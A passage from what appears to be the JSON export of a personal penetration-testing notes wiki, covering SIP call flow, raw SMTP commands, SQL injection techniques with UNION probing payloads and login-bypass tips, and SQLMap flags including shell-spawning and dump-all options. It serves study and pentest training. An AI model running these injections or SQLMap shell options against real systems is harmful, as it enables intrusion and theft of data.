stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sip&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sip&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;INVITE sip:201@192.168.1.104 SIP/2.0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Via: SIP/2.0/UDP 192.168.1.102;rport;branch=z9hG4bKvbxaoqar&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Max-Forwards: 70 &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;To: &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;From: &quot;NightRanger&quot; ;tag=eihgg&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Call-ID: hfxsabthoymshub@backtrack&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CSeq: 649 INVITE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Contact: &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Content-Type: application/sdp &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Allow: INVITE,ACK,BYE,CANCEL,OPTIONS,PRACK,REFER,NOTIFY,SUBSCRIBE,INFO,MESSAGE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Supported: replaces,norefersub,100rel&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;User-Agent: Twinkle/1.2 &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Content-Length: 310&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;sip-responses&quot;&gt;SIP responses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#sip-responses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;1xx — Informational responses.&lt;/li&gt;\n&lt;li&gt;2xx — Successful responses: The action was successfully received, understood, and accepted.&lt;/li&gt;\n&lt;li&gt;3xx — Redirection responses.&lt;/li&gt;\n&lt;li&gt;4xx — Request failure responses: The request contains bad syntax or cannot be fulfilled at the server.&lt;/li&gt;\n&lt;li&gt;5xx — Server failure responses: The server failed to fulfill an apparently valid request.&lt;/li&gt;\n&lt;li&gt;6xx — Global failure responses: The request cannot be fulfilled at any server.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;example-sip-call&quot;&gt;Example SIP call&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#example-sip-call&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;The calling phone sends an invite.&lt;/li&gt;\n&lt;li&gt;The called phone sends back a response of 100 (Trying).&lt;/li&gt;\n&lt;li&gt;The called phone then starts to ring and sends a response of 180 (Ringing).&lt;/li&gt;\n&lt;li&gt;When the caller picks up the phone the called phone sends a response of 200 (OK).&lt;/li&gt;\n&lt;li&gt;The calling phone sends an ACK response.&lt;/li&gt;\n&lt;li&gt;Conversation begins via RTP.&lt;/li&gt;\n&lt;li&gt;When the caller hangs up the phone a BYE request is sent.&lt;/li&gt;\n&lt;li&gt;The calling phone responds with 200 (OK).&lt;/li&gt;\n&lt;/ol&gt;"},"spells/SMTP":{"slug":"spells/SMTP","filePath":"spells/SMTP.md","title":"SMTP","links":[],"tags":["Protocol/SMTP"],"content":"A set of Simple Mail Transfer Protocol (SMTP) commands to send an email:\nHELO somehostname\nMAIL FROM:fromaddress@host1.tld\nRCPT TO:toaddress@host2.tld\nDATA\nTo: &quot;To Address&quot; &lt;toaddress@host2.tld&gt;\nFrom: &quot;From Address&quot; &lt;fromaddress@host1.tld&gt;\nSubject: An Email\nThis is content.\n \nHere is another line.\n.\nQUIT\nNote that MAIL FROM / From and RCPT TO / To are not actually required to match, though failure to fill in the MAIL FROM / RCPT TO commands may result in the message being rejected. The commands above are not case-sensitive, and the message ends with a . on a single line.","richContent":"&lt;p&gt;A set of Simple Mail Transfer Protocol (SMTP) commands to send an email:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;smtp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;smtp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;HELO somehostname&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;MAIL FROM:fromaddress@host1.tld&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RCPT TO:toaddress@host2.tld&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;DATA&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;To: &quot;To Address&quot; &amp;#x3C;toaddress@host2.tld&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;From: &quot;From Address&quot; &amp;#x3C;fromaddress@host1.tld&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Subject: An Email&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;This is content.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Here is another line.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;QUIT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/10822190/in-smtp-must-the-rcpt-to-and-to-match&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Note that &lt;code&gt;MAIL FROM&lt;/code&gt; / &lt;code&gt;From&lt;/code&gt; and &lt;code&gt;RCPT TO&lt;/code&gt; / &lt;code&gt;To&lt;/code&gt; are not actually required to match, though failure to fill in the &lt;code&gt;MAIL FROM&lt;/code&gt; / &lt;code&gt;RCPT TO&lt;/code&gt; commands &lt;em&gt;may&lt;/em&gt; result in the message being rejected.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; The commands above are &lt;em&gt;not&lt;/em&gt; case-sensitive, and the message ends with a &lt;code&gt;.&lt;/code&gt; on a single line.&lt;/p&gt;"},"spells/SQL-injection-attacks":{"slug":"spells/SQL-injection-attacks","filePath":"spells/SQL injection attacks.md","title":"SQL injection attacks","links":["spells/PHP","spells/HTTP","spells/Burp-Suite","spells/MySQL","journals/2022-02-02"],"tags":["AttackCycle/Exploitation/SQLi","Language/PHP","Protocol/HTTP","Application/BurpSuite","Language/SQL","Application/MySQL","AttackCycle/PrivEsc","AttackCycle/Reconnaissance"],"content":"SQL injection is most common in PHP-based apps (though other languages are also vulnerable).\nThe canonical SQL injection “test” is to input a single quote and see if that generates an error. Remember, though, that there are three different kinds of quotes you may need to test!\nWhen injecting code, you’ll often want to end with a trailing “--” (space-dash-dash-space) in order to comment out the remainder or the line you’re injecting into. Generally “ --+”, “ --%20”, or “ -- -” will be needed in practice to prevent the trailing space from being eaten. On some flavors of SQL, “# ” (and variants of the trailing space) will work too. (And sometimes you don’t even need the trailing comment, if the value you’re injecting into is at the end of a statement…)\nYou don’t necessarily know how user inputs are going to be processed on the backend. Sometimes its one query. Sometimes it’s multiple queries. This means that you sometimes need to inject SQL into multiple fields (particularly when trying to subvert a login).\nSimilarly, sometimes a developer might get “clever” and try to error out on trailing comments. If you suspect that’s happening, just add something after the trailing “--” — it’s all a comment, after all!\nIt’s common to also test that login queries only return a single result. So sometimes you need to tack on LIMIT 1 to achieve a login bypass.\nTypes of SQLi\nError-based\nError-based SQLi retrieves data from the backend by abusing error messages. This obviously requires that error messages are shown to the end user, and is limited to information gathering.\nBoolean-based\nBoolean-based SQLi involves monitoring changes in responses to see if a query has executed or failed. The only reason you’d generally do this is if you’re doing SQLi blind (where you don’t get any output, or the output you do get isn’t strongly coupled with the input query).\nObviously, this requires that either the HTTP response code or payload changes depending on the results of the injection… (Some frameworks try to make blind SQLi difficult by using redirects, but it’s possible — though a pain — to get around this with Burp Suite).\nOne way this can be useful more generally is by using something like AND (SELECT COUNT(*) FROM table_name) &gt; 0 to probe for the existence/use of table_name.\nTime-based\nThis is basically boolean-based SQLi, except that we’re not even getting back true/false information anymore. However, we can introduce a timing attack by replacing a column with sleep() (which sleeps the connection for the specified number of seconds). If the query fails we’ll get a return immediately, but if it succeeds then we’ll experience the programmed pause.\nUnion-based\nUnion-based SQLi is basically just abusing the SQL UNION keyword.\nTo determine the number of columns in a table you’ll need to use a sequence of UNION clauses until you run into and error.\n\n&#039; UNION SELECT NULL -- \n&#039; UNION SELECT NULL, NULL -- \n&#039; UNION SELECT NULL, NULL, NULL -- \n…and so on until there’s an error…\n\nA similar approach can be used to detect column types.\n\n&#039; UNION SELECT &#039;a&#039;, NULL, NULL -- \n&#039; UNION SELECT NULL, &#039;a&#039;, NULL -- \n&#039; UNION SELECT NULL, NULL, &#039;a&#039; -- \n…and so on…\n\nThe generalization to other data types is straight-forward.\nUseful MySQL keywords:\n\ndatabase()\nuser() and current_user()\nversion() or @@version\n\nThe GROUP_CONCAT() function can be useful here: It concatenates fields (and arbitrary strings) in a row, and then further groups rows separated by commas (or by a string specified using SEPARATOR). CONCAT() also works for this (use 0x3a to insert : characters as separators).\nIt’s worth checking out the Jurassic Park CTF for an example of how to use union-based SQLi (it’s a little hard to summarize).\nAuthentication bypasses\nThe trick here is that most login forms use the backing database for authentication, so all we need to do is return a “true” result — we don’t really need to guess anyone’s password. Sometimes we don’t even need to know a username (though I suspect that in practice this may lead to weird authorization problems).\nOut-of-band\nOut-of-band SQLi only works if the application or database makes external calls (preferably to a system we control!) based on the results of a database query (that we can inject into). Thus, there are always two channels — an attack channel and a data channel.\nDNS is a popular data channel for out-of-band SQLi attacks.\nDefense\nThere are two main strategies for defending against SQLi:\n\nGet your encoding right. User-generated code that’s passed off to SQL needs to be SQL-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!\nUser prepared queries (in code) and stored procedures (in the database) to limit the ability of user-generated code to influence the surrounding SQL.\n","richContent":"&lt;p&gt;SQL injection is &lt;em&gt;most&lt;/em&gt; common in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;-based apps (though other languages are also vulnerable).&lt;/p&gt;\n&lt;p&gt;The canonical SQL injection “test” is to input a single quote and see if that generates an error. Remember, though, that there are &lt;em&gt;three&lt;/em&gt; different kinds of quotes you may need to test!&lt;/p&gt;\n&lt;p&gt;When injecting code, you’ll &lt;em&gt;often&lt;/em&gt; want to end with a trailing “&lt;code&gt;--&lt;/code&gt;” (space-dash-dash-space) in order to &lt;em&gt;comment out&lt;/em&gt; the remainder or the line you’re injecting into. Generally “&lt;code&gt; --+&lt;/code&gt;”, “&lt;code&gt; --%20&lt;/code&gt;”, or “&lt;code&gt; -- -&lt;/code&gt;” will be needed in practice to prevent the trailing space from being eaten. On some flavors of SQL, “&lt;code&gt;# &lt;/code&gt;” (and variants of the trailing space) will work too. (And sometimes you don’t even need the trailing comment, if the value you’re injecting into is at the end of a statement…)&lt;/p&gt;\n&lt;p&gt;You don’t necessarily know &lt;em&gt;how&lt;/em&gt; user inputs are going to be processed on the backend. Sometimes its one query. Sometimes it’s multiple queries. This means that you sometimes need to inject SQL into &lt;em&gt;multiple&lt;/em&gt; fields (particularly when trying to subvert a login).&lt;/p&gt;\n&lt;p&gt;Similarly, sometimes a developer might get “clever” and try to error out on trailing comments. If you suspect that’s happening, just add something after the trailing “&lt;code&gt;--&lt;/code&gt;” — it’s all a comment, after all!&lt;/p&gt;\n&lt;p&gt;It’s common to also test that login queries only return a single result. So sometimes you need to tack on &lt;code&gt;LIMIT 1&lt;/code&gt; to achieve a login bypass.&lt;/p&gt;\n&lt;h2 id=&quot;types-of-sqli&quot;&gt;Types of SQLi&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#types-of-sqli&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;error-based&quot;&gt;Error-based&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#error-based&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Error-based SQLi retrieves data from the backend by abusing error messages. This obviously requires that error messages are shown to the end user, and is limited to information gathering.&lt;/p&gt;\n&lt;h3 id=&quot;boolean-based&quot;&gt;Boolean-based&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#boolean-based&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Boolean-based SQLi involves monitoring changes in responses to see if a query has executed or failed. The only reason you’d generally do this is if you’re doing SQLi blind (where you don’t get any output, or the output you do get isn’t strongly coupled with the input query).&lt;/p&gt;\n&lt;p&gt;Obviously, this requires that either the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; response code or payload changes depending on the results of the injection… (Some frameworks try to make blind SQLi difficult by using redirects, but it’s possible — though a pain — to get around this with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;).&lt;/p&gt;\n&lt;p&gt;One way this can be useful more generally is by using something like &lt;code&gt;AND (SELECT COUNT(*) FROM table_name) &gt; 0&lt;/code&gt; to probe for the existence/use of &lt;code&gt;table_name&lt;/code&gt;.&lt;/p&gt;\n&lt;h3 id=&quot;time-based&quot;&gt;Time-based&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#time-based&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;This is basically boolean-based SQLi, except that we’re not even getting back true/false information anymore. However, we can introduce a timing attack by replacing a column with &lt;code&gt;sleep()&lt;/code&gt; (which sleeps the connection for the specified number of seconds). If the query fails we’ll get a return immediately, but if it succeeds then we’ll experience the programmed pause.&lt;/p&gt;\n&lt;h3 id=&quot;union-based&quot;&gt;Union-based&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#union-based&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Union-based SQLi is basically just abusing the SQL UNION keyword.&lt;/p&gt;\n&lt;p&gt;To determine the number of columns in a table you’ll need to use a sequence of UNION clauses until you run into and error.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT NULL -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT NULL, NULL -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT NULL, NULL, NULL -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;…and so on until there’s an error…&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;A similar approach can be used to detect column types.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT &#039;a&#039;, NULL, NULL -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT NULL, &#039;a&#039;, NULL -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;&#039; UNION SELECT NULL, NULL, &#039;a&#039; -- &lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;…and so on…&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The generalization to other data types is straight-forward.&lt;/p&gt;\n&lt;p&gt;Useful &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt; keywords:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;database()&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;user()&lt;/code&gt; and &lt;code&gt;current_user()&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;version()&lt;/code&gt; or &lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The &lt;code&gt;GROUP_CONCAT()&lt;/code&gt; function can be useful here: It concatenates fields (and arbitrary strings) in a row, and then further groups rows separated by commas (or by a string specified using SEPARATOR). &lt;code&gt;CONCAT()&lt;/code&gt; also works for this (use &lt;code&gt;0x3a&lt;/code&gt; to insert &lt;code&gt;:&lt;/code&gt; characters as separators).&lt;/p&gt;\n&lt;p&gt;It’s worth checking out the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./journals/2022-02-02&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-02-02&quot;&gt;Jurassic Park CTF&lt;/a&gt; for an example of how to use union-based SQLi (it’s a little hard to summarize).&lt;/p&gt;\n&lt;h3 id=&quot;authentication-bypasses&quot;&gt;Authentication bypasses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#authentication-bypasses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The trick here is that most login forms use the backing database for authentication, so all we need to do is return a “true” result — we don’t really need to guess anyone’s password. Sometimes we don’t even need to know a username (though I suspect that in practice this may lead to weird authorization problems).&lt;/p&gt;\n&lt;h3 id=&quot;out-of-band&quot;&gt;Out-of-band&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#out-of-band&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Out-of-band SQLi only works if the application or database makes external calls (preferably to a system we control!) based on the results of a database query (that we can inject into). Thus, there are always two channels — an attack channel and a data channel.&lt;/p&gt;\n&lt;p&gt;DNS is a popular data channel for out-of-band SQLi attacks.&lt;/p&gt;\n&lt;h2 id=&quot;defense&quot;&gt;Defense&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#defense&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;There are two main strategies for defending against SQLi:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Get your encoding right. User-generated code that’s passed off to SQL needs to be SQL-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!&lt;/li&gt;\n&lt;li&gt;User prepared queries (in code) and stored procedures (in the database) to limit the ability of user-generated code to influence the surrounding SQL.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/SQLMap":{"slug":"spells/SQLMap","filePath":"spells/SQLMap.md","title":"SQLMap","links":["spells/SQL-injection-attacks","spells/MySQL","spells/meterpreter","spells/Burp-Suite"],"tags":["Application/SQLMap","AttackCycle/Exploitation/SQLi","Application/Metasploit/meterpreter","Application/MySQL","Application/PostgreSQL"],"content":"Used to automate SQLi attacks (and apparently banned on the OSCP because it makes things too easy).\nUseful flags:\n\n-u URL/--url=URL — process URL (this must include the query parameters or you must specify POST parameters using --data)\n-p — which URL parameter(s) (variables) to test\n--dbms=DB_TYPE — only use injections for a given type of backend database (MySQL, PostgreSQL, etc.)\n--dbs — enumerate DBs\n-D/-T/-C — dump a specific database/table/column\n--dump/--dump-all/--all — dump data\n--os-shell — attempt to spawn an interactive shell\n--os-pwn — attempt to spawn a Metasploit meterpreter shell or VNC session\n--forms — parse target URL for forms, and use these\n--batch — don’t prompt for user input, just use the defaults\n--risk — set the maximum risk level of tests (1 – 3, lowest to highest risk)\n\nFor example:\nsqlmap -u example.com/test.php \\\n       --dump-all\nOr:\nsqlmap -u example.com/test.php \\\n       --data input=foo --dump-all\nOne handy way to seed a URL is using requests harvested with Burp Suite.","richContent":"&lt;p&gt;Used to &lt;a href=&quot;https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;automate&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SQL-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQL-injection-attacks&quot;&gt;SQLi&lt;/a&gt; attacks (and apparently banned on the OSCP because it makes things too easy).&lt;/p&gt;\n&lt;p&gt;Useful flags:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-u URL&lt;/code&gt;/&lt;code&gt;--url=URL&lt;/code&gt; — process URL (this &lt;em&gt;must&lt;/em&gt; include the query parameters 